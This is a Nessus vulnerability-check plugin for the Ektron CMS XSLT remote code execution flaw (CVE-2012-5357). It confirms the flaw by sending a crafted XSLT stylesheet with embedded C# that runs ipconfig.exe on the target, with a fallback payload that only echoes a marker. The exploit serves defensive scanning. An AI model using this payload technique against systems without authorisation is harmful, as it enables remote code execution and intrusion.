#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(63245);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2016/05/05 16:01:13 $");

  script_cve_id("CVE-2012-5357");
  script_bugtraq_id(56816);
  script_osvdb_id(88107);
  script_xref(name:"MSVR", value:"MSVR12-016");

  script_name(english:"Ektron CMS XslCompiledTransform Class Request Parsing Remote Code Execution");
  script_summary(english:"Tries to execute code on the remote host");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server hosts a web application that is affected by a
remote code execution vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of Ektron CMS hosted on the remote web server is affected
by a remote code execution vulnerability.  The vulnerability arises
because the 'ekajaxtransform.aspx' script utilizes the .NET
'XslCompiledTransform' class with 'enablescript' set to true. 

Nessus was able to execute this vulnerability via a specially crafted
POST request to run arbitrary C# code on the remote host.

Note that the version of Ektron installed on the remote host likely
has other vulnerabilities that Nessus has not tested for."
  );
  # http://webstersprodigy.net/2012/10/25/cve-2012-5357cve-1012-5358-cool-ektron-xslt-rce-bugs/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?6848e77e");
  script_set_attribute(attribute:"see_also", value:"http://technet.microsoft.com/en-us/security/msvr/msvr12-016");
  # http://documentation.ektron.com/current/ReleaseNotes/ReleaseNotes_WebHelp.htm#Release8/8.02SP5.htm
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?40c65f37");
  script_set_attribute(attribute:"solution", value:"Upgrade to Ektron CMS version 8.02 Service Pack 5 or higher.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Ektron 8.02 XSLT Transform Remote Code Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/10/25");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/10/26");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/12/12");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:ektron:cms4000.net");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2016 Tenable Network Security, Inc.");

  script_dependencies("ektron_cms400_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/cms400", "www/ASP");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("url_func.inc");

function encapsulate_xslt_payload(code_payload)
{
  return
  '<?xml version=\'1.0\'?>\n' +
  '<xsl:stylesheet version="1.0"\n' +
  'xmlns:xsl="http://www.w3.org/1999/XSL/Transform"\n' +
  'xmlns:msxsl="urn:schemas-microsoft-com:xslt"\n' +
  'xmlns:user="http://mycompany.com/mynamespace">\n' +
  '<msxsl:script language="C#" implements-prefix="user">\n' +
  '<![CDATA[\n' +
  'public string xml()\n' +
  '{\n' +
  code_payload +
  '}\n' +
  ']]>\n' +
  '</msxsl:script>\n' +
  '<xsl:template match="/">\n' +
  '<xsl:value-of select="user:xml()"/>\n' +
  '</xsl:template>\n' +
  '</xsl:stylesheet>';
}

port = get_http_port(default:80, asp:TRUE);

install = get_install_from_kb(appname:'cms400', port:port, exit_on_fail:TRUE);
dir = install['dir'];

appname = "Ektron CMS400.NET";
report = '';

test_return_code = SCRIPT_NAME + rand();

# First test payload - more interesting but may not work in every environment
code_payload1 = 
'System.Diagnostics.Process p = new System.Diagnostics.Process();\n' + 
'p.StartInfo.UseShellExecute = false;\n' +
'p.StartInfo.RedirectStandardOutput = true;\n' +
'p.StartInfo.FileName = "ipconfig.exe";\n' +
'p.Start();\n' +
'p.WaitForExit();\n' +
'string output = p.StandardOutput.ReadToEnd();\n' +
'return output;';

# Second test payload - should work even in a restrictive environment
code_payload2 =
'return "' + test_return_code + '";\n';

postdata = "xml=AAA&xslt=" + urlencode(str:encapsulate_xslt_payload(code_payload: code_payload1));

res = http_send_recv3(method: "POST", 
                      item: dir + "/WorkArea/ContentDesigner/ekajaxtransform.aspx", 
                      port: port,
                      add_headers: make_array("Content-Type", "application/x-www-form-urlencoded;",
                                              "Referer", build_url(qs:'', port:port)), # Required
                      data: postdata, 
                      exit_on_fail: TRUE);

if ("Windows IP Configuration" >< res[2])
{
  vuln_request = http_last_sent_request();
  vuln_response = chomp(res[2]); 

  report = '\nNessus was able to exploit the vulnerability to run the \'ipconfig\'' +
           '\ncommand with the following request : ';

  report += '\n\n' + 
            crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
            vuln_request + '\n' +
            crap(data:"-" , length:30) +  " snip " + crap(data:"-", length:30) + '\n';

  if (report_verbosity > 1)
    report += '\nResponse : ' + '\n\n' + 
              crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
              vuln_response + '\n' +
              crap(data:"-" , length:30) +  " snip " + crap(data:"-", length:30) + '\n';
}
else
{
  # try backup payload 
  postdata = "xml=AAA&xslt=" + urlencode(str:encapsulate_xslt_payload(code_payload: code_payload2));
  res = http_send_recv3(method: "POST", 
                        item: dir + "/WorkArea/ContentDesigner/ekajaxtransform.aspx", 
                        port: port,
                        add_headers: make_array("Content-Type", "application/x-www-form-urlencoded;",
                                                "Referer", build_url(qs:'', port:port)), # Required
                        data: postdata, 
                        exit_on_fail: TRUE);

  if("200" >< res[0] && test_return_code == chomp(res[2])) 
  {
    vuln_request = http_last_sent_request();
    vuln_response = chomp(res[2]);
  
    report = '\nNessus was able to verify the vulnerability exists with the following' +
             '\nrequest : ';

    report += '\n\n' + 
              crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
              vuln_request + '\n' +
              crap(data:"-" , length:30) +  " snip " + crap(data:"-", length:30) + '\n';
  }
}

if (report != '')
{
  if (report_verbosity > 0) security_hole(port:port,extra:report);
  else security_hole(port);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, appname, build_url(port:port, qs:dir));
